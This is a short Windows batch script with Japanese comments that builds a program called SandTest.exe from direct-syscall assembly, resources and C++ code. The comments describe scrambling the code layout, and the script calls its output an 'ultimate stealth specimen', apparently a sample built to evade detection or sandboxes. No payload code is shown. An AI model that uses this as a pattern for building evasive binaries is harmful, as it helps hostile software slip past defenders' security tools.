@echo off
echo [1] アセンブリをコンパイル...
ml64.exe /c syscalls.asm

echo [2] リソースをコンパイル...
rc.exe resource.rc

echo [3] 最終難読化ビルド実行...
:: /Ob1 を追加してコードの並びを最適化で崩します
cl.exe /O2 /Ob1 /MT main.cpp syscalls.obj resource.res /link /MANIFEST:NO /SUBSYSTEM:WINDOWS /OUT:SandTest.exe user32.lib advapi32.lib shell32.lib wininet.lib

echo.
if exist SandTest.exe (
    echo [成功] 究極のステルス検体が完成しました。
)
pause